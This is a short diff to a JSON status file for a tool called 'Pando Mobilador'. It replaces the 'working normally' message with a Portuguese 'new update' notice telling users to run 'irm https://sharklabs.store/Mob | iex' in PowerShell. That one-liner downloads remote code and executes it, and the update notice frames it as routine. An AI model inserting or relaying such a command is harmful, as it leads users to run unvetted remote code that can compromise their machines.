@@ -1,5 +1,5 @@
 {
   "active": false,
-  "message": "Pando Mobilador esta funcionando normalmente.",
+  "message": "Nova atualização! execute no Powershell irm https://sharklabs.store/Mob | iex",
   "version": "1.0"
 }
